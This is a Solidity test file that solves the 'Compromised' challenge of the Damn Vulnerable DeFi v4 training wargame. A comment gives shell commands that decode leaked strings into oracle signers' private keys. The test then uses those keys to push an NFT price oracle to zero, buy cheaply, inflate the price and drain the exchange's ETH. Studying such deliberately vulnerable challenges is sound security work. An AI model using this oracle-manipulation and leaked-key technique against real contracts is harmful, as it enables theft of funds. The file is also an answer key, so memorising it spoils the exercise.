// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */

    /*  
        To recover the private keys, we used the following bash commands:

        # For the first private key
        PRIVATE_KEY1=$(echo -n "4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30" | 
            tr -d ' ' |           # Remove all spaces from the hex string
            xxd -r -p |           # Convert hex to binary
            base64 -d |           # Decode from base64
            cast --to-hex         # Convert the result to a hex string
        )
        echo "Private Key 1: $PRIVATE_KEY1"
        ADDRESS1=$(cast wallet address $PRIVATE_KEY1)  # Derive Ethereum address from the private key
        echo "Address 1: $ADDRESS1"

        # For the second private key
        PRIVATE_KEY2=$(echo -n "4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35" | 
            tr -d ' ' |           # Remove all spaces from the hex string
            xxd -r -p |           # Convert hex to binary
            base64 -d |           # Decode from base64
            cast --to-hex         # Convert the result to a hex string
        )
        echo "Private Key 2: $PRIVATE_KEY2"
        ADDRESS2=$(cast wallet address $PRIVATE_KEY2)  # Derive Ethereum address from the private key
        echo "Address 2: $ADDRESS2"
    */

    function test_compromised() public checkSolved {
        // Use the recovered private keys
        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        // Get corresponding addresses
        address source1 = vm.addr(privateKey1);
        address source2 = vm.addr(privateKey2);

        // Verify these addresses are in the trusted sources
        bool foundSource1 = false;
        bool foundSource2 = false;
        for (uint256 i = 0; i < sources.length; i++) {
            if (sources[i] == source1) foundSource1 = true;
            if (sources[i] == source2) foundSource2 = true;
        }
        require(foundSource1 && foundSource2, "Derived addresses are not in the trusted sources");

        // Manipulate the oracle price to 0
        vm.startPrank(source1);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();

        // Buy an NFT at the manipulated price
        vm.startPrank(player);
        uint256 tokenId = exchange.buyOne{value: 1 wei}();
        vm.stopPrank();

        // Manipulate the price again to drain the exchange
        uint256 drainPrice = address(exchange).balance;
        vm.startPrank(source1);
        oracle.postPrice("DVNFT", drainPrice);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", drainPrice);
        vm.stopPrank();

        // Sell the NFT at the inflated price
        vm.startPrank(player);
        nft.approve(address(exchange), tokenId);
        exchange.sellOne(tokenId);

        // Transfer the funds to the recovery address
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();

        // Reset the oracle price to the initial price
        vm.startPrank(source1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(source2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
